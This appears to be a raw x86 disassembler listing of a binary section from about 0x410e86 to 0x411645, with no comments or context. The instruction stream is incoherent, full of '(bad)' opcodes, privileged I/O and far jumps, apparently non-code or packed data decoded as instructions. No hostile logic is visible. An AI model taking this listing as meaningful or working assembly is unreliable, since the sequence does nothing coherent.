  410e86:	arpl   WORD PTR [edx+0x60],cx
  410e89:	sub    DWORD PTR es:[edx],edi
  410e8c:	jp     0x410eb4
  410e8e:	and    eax,0x52ee1f45
  410e93:	push   ebx
  410e94:	(bad)  
  410e95:	push   ecx
  410e96:	scas   eax,DWORD PTR es:[edi]
  410e97:	test   eax,0xae54bc34
  410e9c:	inc    edx
  410e9d:	add    BYTE PTR [edi],ah
  410e9f:	xor    BYTE PTR [ecx+0x1479e1fe],dl
  410ea5:	inc    eax
  410ea6:	add    al,0x4b
  410ea8:	test   eax,0xaa5032d3
  410ead:	jno    0x410e6c
  410eaf:	hlt    
  410eb0:	xor    bh,dl
  410eb2:	adc    dl,BYTE PTR [esi]
  410eb4:	inc    eax
  410eb5:	push   cs
  410eb6:	jmp    0xf448bce7
  410ebb:	sub    eax,0x75bae481
  410ec0:	jle    0x410ed7
  410ec2:	enter  0x5e46,0x61
  410ec6:	jmp    0x582b61a9
  410ecb:	xchg   esp,eax
  410ecc:	push   ebx
  410ecd:	mov    cl,0xb0
  410ecf:	mov    WORD PTR [ecx+ecx*2+0x6b],cs
  410ed3:	xor    al,0x1d
  410ed5:	pop    es
  410ed6:	enter  0x2c52,0x64
  410eda:	dec    esp
  410edb:	and    eax,DWORD PTR [edi-0x2d]
  410ede:	lock xchg esp,eax
  410ee0:	dec    esp
  410ee1:	fwait
  410ee2:	aaa    
  410ee3:	int    0xd3
  410ee5:	xlat   BYTE PTR ds:[ebx]
  410ee6:	call   0x802d1353
  410eeb:	rol    BYTE PTR [edx+0x1d],1
  410eee:	adc    DWORD PTR [ecx+ebx*4],edi
  410ef1:	mov    es,esp
  410ef3:	add    al,0x75
  410ef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ef6:	in     al,dx
  410ef7:	loope  0x410f4a
  410ef9:	jne    0x410e92
  410efb:	out    dx,eax
  410efc:	xchg   esp,eax
  410efd:	mov    dh,0xaa
  410eff:	mov    edx,0x722aea43
  410f04:	outs   dx,BYTE PTR ds:[esi]
  410f05:	outs   dx,BYTE PTR ds:[esi]
  410f06:	fwait
  410f07:	(bad)  
  410f08:	popa   
  410f09:	fnstsw WORD PTR ds:0xb13161a5
  410f0f:	popf   
  410f10:	or     edx,DWORD PTR [ebp+edi*8-0x18]
  410f14:	jle    0x410ee8
  410f16:	sub    ebx,DWORD PTR [ebx]
  410f18:	fs sub al,0xd8
  410f1b:	sub    esi,esp
  410f1d:	popw   ds
  410f1f:	(bad)  
  410f21:	dec    eax
  410f22:	mov    ah,0xb2
  410f24:	cli    
  410f25:	sub    edi,DWORD PTR [ebx+0x58]
  410f28:	sub    BYTE PTR [ebx-0x2fb895cb],dl
  410f2e:	mov    esi,0x20a52704
  410f33:	jg     0x410ebf
  410f35:	fsubp  st(0),st
  410f37:	aas    
  410f38:	mov    eax,ds:0x6e883d8
  410f3d:	lds    esi,FWORD PTR es:[ecx-0x623887dc]
  410f44:	adc    edi,edx
  410f46:	(bad)  
  410f47:	call   DWORD PTR [ebx]
  410f49:	sbb    BYTE PTR [eax+0x7daa61d7],al
  410f4f:	(bad)  
  410f50:	adc    DWORD PTR [edx],0xffffffd7
  410f53:	mov    DWORD PTR [edi+0x5ce696e9],esi
  410f59:	lds    esp,FWORD PTR [ecx]
  410f5b:	ja     0x410f76
  410f5d:	pop    ebp
  410f5e:	int    0x5c
  410f60:	(bad)  
  410f61:	out    dx,eax
  410f62:	xchg   DWORD PTR [edx],esi
  410f64:	test   BYTE PTR [ebx-0x80],0x1
  410f68:	mov    ah,BYTE PTR [edi+0x1b]
  410f6b:	pusha  
  410f6c:	fwait
  410f6d:	mov    dl,0xd
  410f6f:	mov    al,0xdb
  410f71:	aas    
  410f72:	push   ecx
  410f73:	and    al,0x40
  410f75:	adc    BYTE PTR [ebx-0xe39e1ef],bl
  410f7b:	(bad)  
  410f7c:	cmp    cl,ch
  410f7e:	stos   BYTE PTR es:[edi],al
  410f7f:	adc    esi,DWORD PTR [eax+edx*4]
  410f82:	sub    cl,dl
  410f84:	sub    eax,0xfbc24351
  410f89:	xor    bl,BYTE PTR [ecx+ebp*4]
  410f8c:	or     BYTE PTR [ebp-0x50],0x95
  410f90:	fnstcw WORD PTR [ebx+ebp*8-0x54]
  410f94:	pop    es
  410f95:	inc    ebx
  410f96:	jb     0x410fa5
  410f98:	test   al,0x32
  410f9a:	push   cs
  410f9b:	div    BYTE PTR [ebp+0x6c]
  410f9e:	dec    ecx
  410f9f:	xor    BYTE PTR [edi+0x63d2f23f],ch
  410fa5:	ins    BYTE PTR es:[edi],dx
  410fa6:	pop    ebp
  410fa7:	dec    edi
  410fa8:	push   cs
  410fa9:	xchg   eax,ebp
  410fab:	daa    
  410fac:	ja     0x411023
  410fae:	int3   
  410faf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fb0:	inc    ebp
  410fb1:	outs   dx,DWORD PTR ds:[esi]
  410fb2:	push   0x5d22e15b
  410fb7:	cmp    DWORD PTR [edx-0x78],edi
  410fba:	and    al,0xb
  410fbc:	sub    DWORD PTR [edi+0x436ea550],ebp
  410fc2:	arpl   bp,dx
  410fc4:	sub    eax,0x31bc927c
  410fc9:	stc    
  410fca:	ret    
  410fcb:	(bad)  
  410fcd:	xor    ecx,edx
  410fcf:	xchg   edi,eax
  410fd0:	dec    esi
  410fd1:	xchg   edi,eax
  410fd2:	fisubr WORD PTR [eax]
  410fd4:	pop    ss
  410fd5:	lahf   
  410fd6:	push   ebp
  410fd7:	add    edi,ecx
  410fd9:	jmp    0x411261
  410fde:	int3   
  410fdf:	into   
  410fe0:	ror    esp,0xc1
  410fe3:	rcl    ecx,cl
  410fe5:	into   
  410fe6:	jbe    0x410f92
  410fe8:	inc    esp
  410fe9:	inc    bp
  410feb:	rcl    DWORD PTR [ebx],1
  410fed:	outs   dx,BYTE PTR ds:[esi]
  410fee:	gs pop edx
  410ff0:	js     0x41106a
  410ff2:	in     eax,0x7e
  410ff4:	js     0x41106e
  410ff6:	xchg   ecx,eax
  410ff7:	lahf   
  410ff8:	push   esp
  410ff9:	and    ecx,DWORD PTR [ebp+0x2b]
  410ffc:	sbb    ah,BYTE PTR [ebx]
  410ffe:	add    DWORD PTR [eax],0xab0d5ae4
  411004:	je     0x410ffa
  411006:	push   edi
  411007:	pop    ss
  411008:	(bad)  
  411009:	pop    ds
  41100a:	cmp    edi,DWORD PTR [eax]
  41100c:	xchg   esi,eax
  41100d:	icebp  
  41100e:	les    edx,FWORD PTR [edx-0x25]
  411011:	pop    ebx
  411012:	lods   al,BYTE PTR ds:[esi]
  411013:	(bad)  
  411014:	and    eax,0xf91dbeb
  411019:	(bad)  
  41101a:	idiv   esp
  41101c:	inc    ebx
  41101d:	lea    ebp,[ebx]
  41101f:	jle    0x411068
  411021:	stc    
  411022:	ja     0x41107d
  411024:	hlt    
  411025:	fnstenv [esi]
  411027:	xor    BYTE PTR [ecx],0x20
  41102a:	scas   al,BYTE PTR es:[edi]
  41102b:	retf   0xd07
  41102e:	pop    ds
  41102f:	fimul  DWORD PTR [edx]
  411031:	add    eax,0xcd9fc2b0
  411036:	stc    
  411037:	daa    
  411038:	add    ecx,0x328b8f56
  41103e:	sub    eax,0x51f7a20c
  411043:	cmp    edx,eax
  411045:	ins    DWORD PTR es:[edi],dx
  411046:	dec    edi
  411047:	(bad)  
  411048:	rcr    DWORD PTR [edx],cl
  41104a:	mov    ds:0x55e2589c,al
  41104f:	lods   eax,DWORD PTR ds:[esi]
  411050:	push   edx
  411051:	lahf   
  411052:	push   ecx
  411053:	mov    al,ds:0xbee88574
  411058:	sbb    BYTE PTR [edi],ah
  41105a:	push   esi
  41105b:	test   DWORD PTR [ebx-0x7e],ebx
  41105e:	add    al,0x50
  411060:	adc    BYTE PTR [ecx],bh
  411062:	or     dl,BYTE PTR [ebx]
  411064:	scas   al,BYTE PTR es:[edi]
  411065:	loop   0x4110c4
  411067:	mov    ds:0x8eb5e6f,eax
  41106c:	mov    dl,0xc4
  41106e:	add    al,0xb5
  411070:	inc    si
  411072:	dec    ebp
  411073:	stos   BYTE PTR es:[edi],al
  411074:	sub    eax,0xb8d351d1
  411079:	cdq    
  41107a:	out    0x56,eax
  41107c:	or     eax,0x33ef4e49
  411081:	xor    DWORD PTR [edx+0x45],eax
  411084:	lods   al,BYTE PTR ds:[esi]
  411085:	fdiv   QWORD PTR [eax+0x3dec990b]
  41108b:	ins    BYTE PTR es:[edi],dx
  41108c:	dec    esi
  41108d:	(bad)  
  41108e:	fild   DWORD PTR ds:0x94b3ca25
  411094:	bound  esp,QWORD PTR [ecx+eiz*8]
  411097:	(bad)  
  411098:	addr16 daa 
  41109a:	and    edx,DWORD PTR [esi]
  41109c:	inc    edx
  41109d:	loopne 0x4110eb
  41109f:	mov    edi,0x85ad3e9b
  4110a4:	push   ecx
  4110a5:	dec    eax
  4110a6:	dec    ecx
  4110a7:	int    0x6e
  4110a9:	shl    DWORD PTR [edi],0x2f
  4110ac:	push   edx
  4110ad:	cmp    ecx,DWORD PTR [eax-0x4b]
  4110b0:	adc    ah,BYTE PTR [edx+0x391727dc]
  4110b6:	mov    ebx,0x31953956
  4110bb:	jbe    0x41106b
  4110bd:	mov    bh,0xa2
  4110bf:	jb     0x41107a
  4110c1:	(bad)  
  4110c3:	xchg   edi,eax
  4110c4:	mov    fs,WORD PTR [ecx]
  4110c6:	pop    eax
  4110c7:	or     eax,0x753de20b
  4110cc:	outs   dx,DWORD PTR ds:[esi]
  4110cd:	jo     0x411064
  4110cf:	scas   al,BYTE PTR es:[edi]
  4110d0:	mov    al,ds:0xa0c487f7
  4110d5:	inc    esp
  4110d6:	sub    dh,BYTE PTR [edx-0x1b]
  4110d9:	imul   esi,DWORD PTR [esi+0x46a56f96],0x4a
  4110e0:	mov    edi,0xfe58b7d2
  4110e5:	mov    bl,0xbf
  4110e7:	les    esp,FWORD PTR [edx-0x1bcf5bfa]
  4110ed:	sub    BYTE PTR [esi-0x7d63f34c],0x19
  4110f4:	jp     0x41115b
  4110f6:	cld    
  4110f7:	retf   0x11a3
  4110fa:	(bad)  
  4110fb:	jb     0x4110ee
  4110fd:	sti    
  4110fe:	or     eax,0xc42b28b3
  411103:	and    eax,0x82326463
  411108:	push   0x366d3964
  41110d:	out    dx,al
  41110e:	mov    esp,0x584d369e
  411113:	pop    ecx
  411114:	lahf   
  411115:	stos   BYTE PTR es:[edi],al
  411116:	mov    al,ds:0xdf062476
  41111b:	xchg   edx,eax
  41111c:	pop    esi
  41111d:	push   ecx
  41111e:	mov    edx,0xaf1cc399
  411123:	int    0xa6
  411125:	out    0xb9,eax
  411127:	or     al,0x81
  411129:	shr    ebx,1
  41112b:	push   ss
  41112c:	push   ebx
  41112d:	inc    BYTE PTR [edx+0x542f7448]
  411133:	inc    esi
  411134:	jbe    0x411130
  411136:	sbb    al,0x7f
  411138:	xchg   ecx,eax
  411139:	scas   eax,DWORD PTR es:[edi]
  41113a:	test   BYTE PTR [ecx-0x292e570e],bl
  411140:	cmp    al,0x77
  411142:	or     ah,bl
  411144:	call   FWORD PTR es:[esi-0x40e726db]
  41114b:	iret   
  41114c:	pop    es
  41114d:	cmp    BYTE PTR [edi+0x3491fe48],bh
  411153:	out    0xce,eax
  411155:	inc    eax
  411156:	push   esi
  411157:	iret   
  411158:	scas   al,BYTE PTR es:[edi]
  411159:	jne    0x411178
  41115b:	cmp    al,BYTE PTR [ebp-0x73914c85]
  411161:	xchg   ebp,eax
  411162:	iret   
  411163:	pop    esi
  411164:	cli    
  411165:	add    eax,0xc2b6a8b4
  41116a:	jle    0x4111d9
  41116c:	cmp    DWORD PTR [esi+0x408f1fb6],edi
  411172:	rcl    esp,0x88
  411175:	or     eax,0x52d29c00
  41117a:	test   BYTE PTR [ebp+0x1af177f5],dl
  411180:	inc    eax
  411181:	retf   0x6625
  411184:	jg     0x41110a
  411186:	push   ds
  411187:	adc    dh,dl
  411189:	or     al,0x92
  41118b:	std    
  41118c:	sar    cl,cl
  41118e:	sbb    BYTE PTR [eax-0x5092042d],ch
  411194:	dec    BYTE PTR [esi-0x383f739b]
  41119a:	mov    ecx,0x9f912a61
  41119f:	test   al,0xa4
  4111a1:	jae    0x411138
  4111a3:	mov    esp,0xdd94068e
  4111a8:	mov    ch,0x25
  4111aa:	pop    edx
  4111ab:	mov    WORD PTR [ebx+0x62967809],?
  4111b1:	into   
  4111b2:	lahf   
  4111b3:	into   
  4111b4:	das    
  4111b5:	nop
  4111b6:	push   esp
  4111b7:	aad    0x36
  4111b9:	das    
  4111ba:	lods   al,BYTE PTR ds:[esi]
  4111bb:	mov    esi,0x36a3256c
  4111c0:	jp     0x411229
  4111c2:	ins    BYTE PTR es:[edi],dx
  4111c3:	lahf   
  4111c4:	xor    ebp,DWORD PTR [esi]
  4111c6:	jo     0x411191
  4111c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111c9:	jg     0x4111d3
  4111cb:	fst    QWORD PTR [edi-0x70]
  4111ce:	push   ebx
  4111cf:	popa   
  4111d0:	push   esp
  4111d1:	ja     0x4111fa
  4111d3:	cmp    cl,BYTE PTR [edx+eiz*2-0x6b]
  4111d7:	(bad)  
  4111d8:	sub    BYTE PTR [ebx],cl
  4111da:	mov    al,ds:0xf33ad90d
  4111df:	je     0x4111bc
  4111e1:	or     BYTE PTR [edi+0x72],0x9b
  4111e5:	test   bl,bh
  4111e7:	inc    ecx
  4111e8:	xor    BYTE PTR [edx],al
  4111ea:	daa    
  4111eb:	loop   0x411210
  4111ed:	pop    ecx
  4111ee:	or     al,BYTE PTR [ebx-0x7a]
  4111f1:	ins    DWORD PTR es:[edi],dx
  4111f2:	pop    ss
  4111f3:	or     al,BYTE PTR fs:[eax+0x60]
  4111f7:	xchg   ebp,eax
  4111f8:	ror    DWORD PTR [ecx],cl
  4111fa:	int    0x1
  4111fc:	cmp    ebx,DWORD PTR [edx+ebp*4+0x35ab51ae]
  411203:	mov    ch,0x58
  411205:	or     DWORD PTR [eax+0x6ea90dc0],0x71ddbe3e
  41120f:	test   BYTE PTR [edx+0x6d5ce9af],ah
  411215:	mov    edx,?
  411217:	mov    ecx,DWORD PTR [ebx]
  411219:	jle    0x411200
  41121b:	mov    bl,0xdb
  41121d:	mov    edx,0x6630cfa3
  411222:	adc    esp,DWORD PTR [ebx+0x18901c29]
  411228:	push   0xffffff88
  41122a:	clc    
  41122b:	xor    DWORD PTR [edi+0x668f7153],esp
  411231:	mov    gs,ebp
  411233:	imul   edx
  411235:	sub    ebp,ebp
  411237:	xor    BYTE PTR [ecx-0x6381aae8],dl
  41123d:	mov    ecx,0x3833dd10
  411242:	jmp    0x525c:0x4bf667af
  411249:	int    0x5a
  41124b:	jae    0x411261
  41124d:	xor    al,0xe7
  41124f:	scas   eax,DWORD PTR es:[edi]
  411250:	(bad)  
  411251:	daa    
  411252:	mov    esp,0xdaf90fdb
  411257:	xchg   esi,eax
  411258:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411259:	leave  
  41125a:	xchg   DWORD PTR [eax+0x4b15a95f],esp
  411260:	or     al,0x3
  411262:	ror    DWORD PTR [edi],1
  411264:	scas   eax,DWORD PTR es:[edi]
  411265:	xlat   BYTE PTR ds:[ebx]
  411266:	jmp    0x4114ee
  41126b:	aas    
  41126c:	xlat   BYTE PTR ds:[ebx]
  41126d:	xlat   BYTE PTR ds:[ebx]
  41126e:	retf   
  41126f:	xlat   BYTE PTR ds:[ebx]
  411270:	retf   
  411271:	rcr    ebx,cl
  411273:	and    cl,ah
  411275:	or     BYTE PTR [eax-0x7e],al
  411278:	stc    
  411279:	pushf  
  41127a:	adc    edx,edx
  41127c:	pop    edi
  41127d:	js     0x4112f7
  41127f:	in     eax,0x7e
  411281:	js     0x4112fb
  411283:	repnz xor BYTE PTR [ebp-0x7b],bl
  411287:	ins    BYTE PTR es:[edi],dx
  411288:	xor    al,BYTE PTR [ebx-0x77]
  41128b:	lds    eax,FWORD PTR [edi-0x19]
  41128e:	(bad)  
  41128f:	rcr    DWORD PTR [ebx],0x3c
  411292:	mov    DWORD PTR [esi+0x56e2beaa],ebp
  411298:	out    0x8d,al
  41129a:	fnclex 
  41129c:	dec    esp
  41129d:	sti    
  41129e:	pop    es
  41129f:	retf   
  4112a0:	push   esp
  4112a1:	fistp  WORD PTR [esi+0x64]
  4112a4:	pushf  
  4112a5:	fld    DWORD PTR [esi+0x69]
  4112a8:	retf   
  4112a9:	gs mov ah,0xc3
  4112ac:	or     DWORD PTR [ebp-0x38686d1c],edi
  4112b2:	out    0xb1,eax
  4112b4:	rol    BYTE PTR [esi-0x13],1
  4112b7:	or     dl,BYTE PTR [edi]
  4112b9:	sub    al,BYTE PTR [edx+0x78]
  4112bc:	pop    esi
  4112bd:	mov    DWORD PTR [ecx+esi*4+0xd5f58fb],edx
  4112c4:	adc    ecx,ebx
  4112c6:	dec    ecx
  4112c7:	sub    edi,edi
  4112c9:	inc    esp
  4112ca:	daa    
  4112cb:	push   ebx
  4112cc:	add    esp,DWORD PTR [ebx-0x22e148f7]
  4112d2:	arpl   WORD PTR [edx],dx
  4112d4:	xlat   BYTE PTR ds:[ebx]
  4112d5:	xchg   ebp,eax
  4112d6:	mov    ds:0x8a90d046,eax
  4112db:	call   0xf2e655d9
  4112e0:	fcmovnbe st,st(1)
  4112e2:	jg     0x411291
  4112e4:	arpl   WORD PTR [edi-0x4e6cacb5],di
  4112ea:	pop    es
  4112eb:	xchg   ebp,eax
  4112ec:	mov    esi,0x67181430
  4112f1:	cmp    BYTE PTR [eax-0x11],al
  4112f4:	add    eax,0x4af3c241
  4112f9:	inc    ebx
  4112fa:	test   DWORD PTR [edx],ebx
  4112fc:	inc    esp
  4112fd:	cld    
  4112fe:	stos   DWORD PTR es:[edi],eax
  4112ff:	push   ss
  411300:	lahf   
  411301:	stc    
  411302:	or     ebx,DWORD PTR [edi+edx*4+0x34]
  411306:	sbb    BYTE PTR [ecx+0x2707c0f8],bl
  41130c:	mov    cl,0x43
  41130e:	mov    bh,bh
  411310:	push   edi
  411311:	add    BYTE PTR [esi-0x7e19098],cl
  411317:	cmp    BYTE PTR [edx+0x491aa071],ch
  41131d:	xchg   esp,eax
  41131e:	fdiv   DWORD PTR [edx+0x1d]
  411321:	sub    al,0x75
  411323:	mov    ds:0x6571c922,al
  411328:	stos   BYTE PTR es:[edi],al
  411329:	cmp    BYTE PTR [edx+0x6fd1201e],al
  41132f:	sbb    cl,dh
  411331:	arpl   WORD PTR es:[esi-0x3c],si
  411335:	imul   ebx,DWORD PTR [ecx-0x36],0xffffffc0
  411339:	leave  
  41133a:	pop    esp
  41133b:	enter  0x5836,0xea
  41133f:	hlt    
  411340:	inc    ebp
  411341:	sub    eax,0xd02ef855
  411346:	jle    0x4112d3
  411348:	mov    ds:0x8254583d,ax
  41134e:	in     al,dx
  41134f:	sub    eax,0xbb7dbca6
  411354:	push   0x9a262fec
  411359:	dec    edi
  41135a:	xchg   ebp,eax
  41135b:	lods   al,BYTE PTR fs:[esi]
  41135d:	mov    dh,0x81
  41135f:	adc    eax,0xffffff89
  411362:	iret   
  411363:	push   ecx
  411364:	gs aad 0x40
  411367:	adc    ah,BYTE PTR [esp+eax*4]
  41136a:	mov    eax,0x5dc5bd87
  41136f:	pop    ss
  411370:	xchg   edi,eax
  411371:	(bad)  
  411372:	mov    al,0xc3
  411374:	in     al,dx
  411375:	dec    ecx
  411376:	test   eax,0x58ee211b
  41137b:	mov    edx,0x3b76830d
  411380:	fnsave [edi+0x3c]
  411383:	dec    ebx
  411384:	mov    bh,BYTE PTR [ebx-0x6a]
  411387:	push   ds
  411388:	or     al,0xc8
  41138a:	xchg   ecx,eax
  41138b:	sbb    edi,0x73
  41138e:	push   ecx
  41138f:	dec    ebp
  411390:	sar    DWORD PTR [edi+eiz*1],cl
  411393:	in     eax,0x57
  411395:	jp     0x411375
  411397:	mov    DWORD PTR [ebp+0xf],ebp
  41139a:	and    al,0xd7
  41139c:	mov    ebp,0xe4a59f15
  4113a1:	xchg   edi,eax
  4113a2:	sahf   
  4113a3:	(bad)  
  4113a4:	xlat   BYTE PTR ds:[ebx]
  4113a5:	inc    edi
  4113a6:	mov    ds:0x4aac4ac0,eax
  4113ab:	fimul  DWORD PTR [esi+0x4b6e623e]
  4113b1:	mov    bh,0xd2
  4113b3:	mov    eax,ds:0x6cf120c3
  4113b8:	sub    ebx,DWORD PTR [ebp-0x7e03a304]
  4113be:	or     DWORD PTR [ebx],ebp
  4113c0:	(bad)  
  4113c1:	fxch   st(1)
  4113c3:	js     0x4113a7
  4113c5:	iret   
  4113c6:	jo     0x411375
  4113c8:	sbb    esi,ecx
  4113ca:	bnd jns 0x411385
  4113cd:	clc    
  4113ce:	adc    edi,DWORD PTR [edi+0x4b]
  4113d1:	sbb    al,0xab
  4113d3:	mov    WORD PTR [edx-0x2e12d83e],?
  4113d9:	out    0xc9,al
  4113db:	out    dx,eax
  4113dc:	pop    ds
  4113dd:	and    BYTE PTR ds:0x25205128,0x35
  4113e4:	mov    edi,0xb9606778
  4113e9:	out    0x3e,al
  4113eb:	xlat   BYTE PTR ds:[ebx]
  4113ec:	add    DWORD PTR [edx-0x59],0xb9b28f0d
  4113f3:	xchg   esp,eax
  4113f4:	pop    ds
  4113f5:	cmp    bh,BYTE PTR [eax+0x6afaa5ad]
  4113fb:	push   ecx
  4113fc:	retf   
  4113fd:	loope  0x4113bc
  4113ff:	xor    al,0xab
  411401:	das    
  411402:	aas    
  411403:	sbb    al,0x9c
  411405:	fdivr  DWORD PTR [ebx-0x74163919]
  41140b:	mov    edi,DWORD PTR [esp+eax*1]
  41140e:	ret    0x76e2
  411411:	jmp    0x9696:0xaa7638b7
  411418:	mov    ebx,0x67f1bfa5
  41141d:	or     BYTE PTR [ecx+ecx*2-0x7e],cl
  411421:	iret   
  411422:	scas   al,BYTE PTR es:[edi]
  411423:	adc    ebx,DWORD PTR [edx+0x2823dc19]
  411429:	sub    al,0x8f
  41142b:	add    BYTE PTR [ebp-0x12784c23],0x30
  411432:	xor    ebx,0xa6e471ab
  411438:	push   ebx
  411439:	mov    al,0x85
  41143b:	push   ss
  41143c:	mov    ah,0x68
  41143e:	mov    ebp,0x53f38aaa
  411443:	add    eax,0xa15666e5
  411448:	sub    al,0x11
  41144a:	xor    edx,edi
  41144c:	xchg   edx,eax
  41144d:	push   esi
  41144e:	mov    ah,0x64
  411450:	inc    esp
  411451:	xchg   bl,al
  411453:	fbld   TBYTE PTR [edi]
  411455:	add    bl,bh
  411457:	fdiv   DWORD PTR [edi-0x6effff2]
  41145d:	(bad)  
  41145e:	retf   0xab94
  411461:	jmp    0x4e3d:0xb455e886
  411468:	cmp    DWORD PTR [ebp-0x36],edx
  41146b:	js     0x411473
  41146d:	into   
  41146e:	call   DWORD PTR [ecx]
  411470:	dec    edi
  411471:	push   ebx
  411472:	rcr    eax,1
  411474:	mov    edx,0x21f6c076
  411479:	ins    BYTE PTR es:[edi],dx
  41147a:	ret    0x45d1
  41147d:	sub    ch,ch
  41147f:	fwait
  411480:	xchg   ebx,eax
  411481:	ins    BYTE PTR es:[edi],dx
  411482:	lods   al,BYTE PTR ds:[esi]
  411483:	mov    al,ds:0xad68c8f7
  411488:	pop    eax
  411489:	push   edi
  41148a:	arpl   di,ax
  41148c:	inc    edx
  41148d:	jmp    0x1a23e50e
  411492:	mov    bh,0x5b
  411494:	xchg   esi,eax
  411495:	jmp    0x411450
  411497:	or     bh,ah
  411499:	pop    es
  41149a:	fsubr  st(2),st
  41149c:	std    
  41149d:	xor    esi,DWORD PTR ds:0x96d8e0be
  4114a3:	cli    
  4114a4:	and    ebx,DWORD PTR [esi+eax*4+0x612474ee]
  4114ab:	(bad)
  4114ae:	je     0x4114b1
  4114b0:	dec    esi
  4114b1:	retf   0xecb3
  4114b4:	arpl   sp,ax
  4114b6:	test   DWORD PTR [eax-0x7e12bbd7],0x43e37f0e
  4114c0:	jno    0x41148d
  4114c2:	lock sti 
  4114c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114c5:	and    dl,dh
  4114c7:	mov    esp,0xd9f68a29
  4114cc:	xor    edx,ecx
  4114ce:	jle    0x4114ed
  4114d0:	mov    ecx,0xc0f91e16
  4114d5:	rcr    DWORD PTR [edx],cl
  4114d7:	pop    esi
  4114d8:	mov    bl,0x46
  4114da:	mov    bh,0x9f
  4114dc:	add    eax,0x887b6e26
  4114e1:	rcl    eax,cl
  4114e3:	jg     0x411488
  4114e5:	adc    DWORD PTR ds:0xf475bd28,esp
  4114eb:	add    eax,DWORD PTR [ebx]
  4114ed:	mov    ds:0x8bf87d8b,al
  4114f2:	pop    ebp
  4114f3:	lock sub ebx,edi
  4114f6:	cmp    ebx,edx
  4114f8:	ja     0x41178e
  4114fe:	jmp    0x411786
  411503:	(bad)  
  411504:	rol    edi,cl
  411506:	(bad)
  411509:	(bad)
  41150c:	xor    bl,BYTE PTR [edi+0x4e]
  41150f:	je     0x4114c2
  411511:	mov    bh,BYTE PTR [eax+0x78785dbf]
  411517:	in     eax,0x7e
  411519:	js     0x411593
  41151b:	aas    
  41151c:	outs   dx,BYTE PTR ds:[esi]
  41151d:	jo     0x411581
  41151f:	push   esi
  411520:	mov    edi,0xfcb644b1
  411525:	std    
  411526:	cmp    ebx,DWORD PTR [ecx+ebp*4]
  411529:	int    0x45
  41152b:	aas    
  41152c:	out    0x76,eax
  41152e:	xchg   DWORD PTR ds:0x12582f9b,ecx
  411534:	je     0x4114ea
  411536:	je     0x411530
  411538:	mov    ebp,0x24d7bfdc
  41153d:	arpl   WORD PTR [edi],bx
  41153f:	ja     0x4114cc
  411541:	in     eax,0xc2
  411543:	neg    DWORD PTR [ecx-0x3ed6611b]
  411549:	repz and BYTE PTR [ebp+0x7a],bl
  41154d:	sub    al,BYTE PTR [ecx*2+0x3ffc30bd]
  411554:	jecxz  0x4114f3
  411556:	jmp    0x4114f8
  411558:	or     edx,edi
  41155a:	mov    dl,0x69
  41155c:	mov    esi,0xb5804c2f
  411561:	ror    cl,cl
  411563:	and    ebp,DWORD PTR [eax+0x22]
  411566:	(bad)
  41156a:	or     eax,0x3f0be1a3
  41156f:	pop    esp
  411570:	xchg   ebx,eax
  411571:	sbb    cl,ah
  411573:	int3   
  411574:	cmp    esi,DWORD PTR [eax]
  411576:	addr16 in eax,0x7b
  411579:	sbb    bl,BYTE PTR [edx+0x28]
  41157c:	ret    0xee89
  41157f:	sbb    edx,DWORD PTR [ebx+0x5e]
  411582:	sub    DWORD PTR [ebx],ebp
  411584:	jp     0x4115d7
  411586:	and    BYTE PTR [ebx],bh
  411588:	xor    eax,0xfc58c273
  41158d:	fcmovnb st,st(3)
  41158f:	sbb    DWORD PTR [edx],edx
  411591:	inc    esp
  411592:	in     al,0x5f
  411594:	mov    dl,0xa0
  411596:	lahf   
  411597:	xor    eax,0xdb967a0a
  41159c:	test   bl,ah
  41159e:	jge    0x4115c1
  4115a0:	ficomp WORD PTR [eax+0x451210e2]
  4115a6:	js     0x41161e
  4115a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115a9:	test   al,0x1e
  4115ab:	jbe    0x411624
  4115ad:	xchg   esi,eax
  4115ae:	in     al,dx
  4115af:	scas   al,BYTE PTR es:[edi]
  4115b0:	jmp    0xc99d223b
  4115b5:	pop    esi
  4115b6:	jmp    0x4ee8:0xcedc5fdb
  4115bd:	mov    WORD PTR [eax-0x2d],es
  4115c0:	lods   al,BYTE PTR ds:[esi]
  4115c1:	les    edi,FWORD PTR [eax+0x694e0d07]
  4115c7:	ins    BYTE PTR es:[edi],dx
  4115c8:	xor    ebx,DWORD PTR [ebx+0x7aeaf238]
  4115ce:	(bad)  
  4115cf:	int3   
  4115d0:	imul   edi,esp,0x9857e2a7
  4115d6:	scas   eax,DWORD PTR es:[edi]
  4115d7:	sbb    cl,BYTE PTR [ecx-0x3c]
  4115da:	stos   DWORD PTR es:[edi],eax
  4115db:	into   
  4115dc:	xor    DWORD PTR [esi],eax
  4115de:	mov    ecx,DWORD PTR [esi+0x7e]
  4115e1:	ins    DWORD PTR es:[edi],dx
  4115e2:	icebp  
  4115e3:	push   es
  4115e4:	repnz pop esi
  4115e6:	lods   eax,DWORD PTR ds:[esi]
  4115e7:	mov    ds:0x722269ee,eax
  4115ec:	add    cl,BYTE PTR [eax+0x249495be]
  4115f2:	hlt    
  4115f3:	das    
  4115f4:	popa   
  4115f5:	aas    
  4115f6:	push   eax
  4115f7:	cmp    ebx,esi
  4115f9:	daa    
  4115fa:	or     DWORD PTR [eax+0x28],eax
  4115fd:	stos   BYTE PTR es:[edi],al
  4115fe:	inc    edi
  4115ff:	jle    0x4115a5
  411601:	fmul   DWORD PTR [ecx]
  411603:	dec    BYTE PTR [edi-0x79]
  411606:	mov    eax,ds:0x7a676523
  41160b:	xchg   esp,eax
  41160c:	inc    edi
  41160d:	or     DWORD PTR [eax+0x40],ebx
  411610:	mov    cl,0x25
  411612:	xor    DWORD PTR [edx-0x2c],edi
  411615:	enter  0x2092,0xb4
  411619:	sbb    edi,DWORD PTR [edx]
  41161b:	jo     0x4115ab
  41161d:	jae    0x411642
  41161f:	mov    eax,ds:0x6eb254c8
  411624:	sbb    bl,BYTE PTR [ebp+0x6c]
  411627:	sbb    eax,0xadda8aa7
  41162c:	and    eax,DWORD PTR [ebx+ebx*4-0x70]
  411630:	push   ecx
  411631:	adc    DWORD PTR ds:0xc634ed4d,ebp
  411637:	out    dx,al
  411638:	sub    eax,0x1714d676
  41163d:	rol    BYTE PTR [esi+0x3b951acf],cl
  411643:	pop    ds
  411644:	xchg   edi,eax
  411645:	enter  0xb69c,0xce
